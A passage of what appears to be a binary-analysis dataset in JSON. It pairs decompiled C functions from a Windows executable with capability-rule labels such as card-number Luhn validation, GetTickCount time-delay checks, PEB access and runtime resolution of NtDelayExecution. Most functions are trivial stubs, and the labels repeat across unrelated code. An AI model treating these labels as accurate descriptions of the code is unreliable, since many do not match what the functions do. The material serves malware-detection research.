        "decompiled_code": "\nvoid fcn.0040bf50(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.0040e2d0(0x4144bc, 0x4144e4);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 127
    },
    "0040d560": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d560(uint s, uint c)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    sub.msvcrt.dll_strrchr(s, c);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 121
    },
    "0040df90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040df90(uint arg_8h, uint *stream)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    if ((arg_8h != '\\0') && ((stream[3] & 0x1000) != 0)) {\n        sub.msvcrt.dll_fflush(stream);\n        stream[3] = stream[3] & 0xffffeeff;\n        stream[6] = 0;\n        *stream = 0;\n        stream[2] = 0;\n    }\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 195
    },
    "0040e0c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040e0c0(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_101h;\n    uint var_48h;\n    uint *var_38h;\n    uint var_2ch;\n    uint *var_20h;\n    uint var_14h;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040e0c0::var_48h;\n    for (iVar1 = 0x12; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.0040ad30(0);\n    var_8h = fcn.0040a930();\n    var_14h = 0x419610;\n    var_2ch = 0x419624;\n    for (var_20h = 0x419610; var_20h != 0x419624; var_20h = var_20h + 1) {\n        var_38h = var_20h;\n        *var_20h = var_8h;\n    }\n    uStack8 = 0x40e144;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 297
    },
    "0040ed30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ed30(int32_t *arg_8h)\n\n{\n    int32_t *in_ECX;\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040ed30::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    *in_ECX = *arg_8h;\n    fcn.00410b60(in_ECX + 1, 0x1cc, arg_8h + 1, *arg_8h << 2);\n    uStack8 = 0x40ed91;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 205
    },
    "0040eda0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040eda0(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint *s;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040eda0::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    *param_1 = 0;\n    s = param_1;\n    sub.msvcrt.dll_memset(param_1 + 1, 0xcc, 0x1cc);\n    uStack8 = 0x40edf5;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 183
    },
    "0040ee70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040ee70(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    int32_t var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040ee70::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = param_1;\n    if (*(param_1 + 8) != '\\0') {\n        fcn.00410def(param_1);\n    }\n    uStack8 = 0x40eeb7;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 185
    },
    "0040eec0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040eec0(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t var_8h;\n    \n    if (*arg_8h == *arg_ch) {\n        for (var_8h = 0; var_8h != *arg_8h; var_8h = var_8h + 1) {\n            if (arg_8h[var_8h + 1] != arg_ch[var_8h + 1]) {\n                return 0;\n            }\n        }\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 159
    },
    "0040ef20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ef20(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_c4h;\n    uint var_4h;\n    \n    puVar2 = &fcn.0040ef20::var_4h;\n    for (iVar1 = 1; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.0040eec0(arg_ch, arg_8h);\n    var_4h = 0x40ef7e;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 163
    },
    "0040ef90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ef90(uint32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.0040ef90::var_10h;\n    for (iVar1 = 4; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    uVar2 = *arg_8h + arg_ch;\n    var_ch = uVar2 + arg_10h;\n    var_8h = CARRY4(*arg_8h, arg_ch) + CARRY4(uVar2, arg_10h);\n    *arg_8h = var_ch;\n    fcn.004117c0();\n    uStack8 = 0x40efeb;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 258
    },
    "0040eff0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0040eff0(uint32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    \n    puVar4 = &var_10h;\n    for (iVar3 = 4; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0xcccccccc;\n        puVar4 = puVar4 + 1;\n    }\n    uVar1 = arg_ch * arg_10h;\n    uVar2 = uVar1 + *arg_8h;\n    var_ch = uVar2 + arg_14h;\n    iVar3 = (arg_ch * arg_10h >> 0x20) + CARRY4(uVar1, *arg_8h) + CARRY4(uVar2, arg_14h);\n    *arg_8h = var_ch;\n    var_8h = iVar3;\n    fcn.00411450();\n    return CONCAT44(iVar3, iVar3);\n}\n",
        "token_count": 284
    },
    "0040f070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t __cdecl fcn.0040f070(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    bool bVar3;\n    uint var_ch;\n    int32_t var_8h;\n    \n    puVar2 = &var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = 0x1f;\n    bVar3 = arg_8h != 0;\n    if (bVar3) {\n        for (; arg_8h >> var_8h == 0; var_8h = var_8h + -1) {\n        }\n    }\n    if (bVar3) {\n        iVar1 = var_8h + 1;\n    }\n    else {\n        iVar1 = 0;\n    }\n    fcn.00411450();\n    return CONCAT14(bVar3, iVar1);\n}\n",
        "token_count": 238
    },
    "004101f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004101f0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 118
    },
    "004103f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004103f0(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int64_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_14h;\n    uint32_t var_8h;\n    uint uStack8;\n    \n    puVar4 = &fcn.004103f0::var_28h;\n    for (iVar3 = 10; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0xcccccccc;\n        puVar4 = puVar4 + 1;\n    }\n    var_8h = 0;\n    for (var_14h = 0; var_14h != arg_ch; var_14h = var_14h + 1) {\n        iVar1 = *(arg_8h + var_14h * 4) * arg_10h;\n        uVar2 = iVar1;\n        var_24h = uVar2 + var_8h;\n        var_20h = (iVar1 >> 0x20) + CARRY4(uVar2, var_8h);\n        *(arg_8h + var_14h * 4) = var_24h;\n        var_8h = fcn.004117c0();\n    }\n    uStack8 = 0x410476;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 360
    },
    "00410cc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410cc0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00410d00(arg_8h, arg_ch, arg_10h);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 139
    },
    "00412540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412540(uint hModule, uint lpFilename, uint nSize)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(hModule, lpFilename, nSize);\n    fcn.004114b0();\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 145
    },
    "00412590": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412590(uint lpModuleName)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(lpModuleName);\n    fcn.004114b0();\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 131
    },
    "004125d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004125d0(uint lpLibFileName, uint hFile, uint dwFlags)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(lpLibFileName, hFile, dwFlags);\n    fcn.004114b0();\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 148
    },
    "00408cc0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408cc0(uint32_t arg_8h)\n\n{\n    uint uVar1;\n    uint var_c4h;\n    \n    if (arg_8h < 0xc) {\n    // switch table (12 cases) at 0x408d44\n        switch(*(arg_8h * 4 + 0x408d44)) {\n        case 0x408ceb:\n            uVar1 = 4;\n            break;\n        case 0x408cf2:\n            uVar1 = 1;\n            break;\n        case 0x408cf9:\n            uVar1 = 2;\n            break;\n        case 0x408d00:\n            uVar1 = 4;\n            break;\n        case 0x408d07:\n            uVar1 = 8;\n            break;\n        case 0x408d0e:\n            uVar1 = 8;\n            break;\n        case 0x408d15:\n            uVar1 = 4;\n            break;\n        case 0x408d1c:\n            uVar1 = 4;\n            break;\n        case 0x408d23:\n            uVar1 = 4;\n            break;\n        case 0x408d2a:\n            uVar1 = 4;\n            break;\n        case 0x408d31:\n            uVar1 = 8;\n            break;\n        case 0x408d38:\n            goto code_r0x00408d38;\n        }\n    }\n    else {\ncode_r0x00408d38:\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 357
    },
    "0040ad50": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040ad50(int32_t arg_8h)\n\n{\n    return arg_8h == -0x1f928c9d;\n}\n",
        "token_count": 38
    },
    "0040de10": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool fcn.0040de10(void)\n\n{\n    uint var_c4h;\n    \n    return *0x4195ac == (*0x41900c | 1);\n}\n",
        "token_count": 40
    },
    "00402380": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nuint fcn.00402380(void)\n\n{\n    int32_t in_FS_OFFSET;\n    \n    return *(*(in_FS_OFFSET + 0x30) + 0x18);\n}\n",
        "token_count": 40
    },
    "00401000": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00401000(void)\n\n{\n    uint uVar1;\n    \n    // [00] -r-x section size 73728 named .text\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(L\"ntdll.dll\", \"NtDelayExecution\");\n    *0x419968 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    return;\n}\n",
        "token_count": 91
    }
}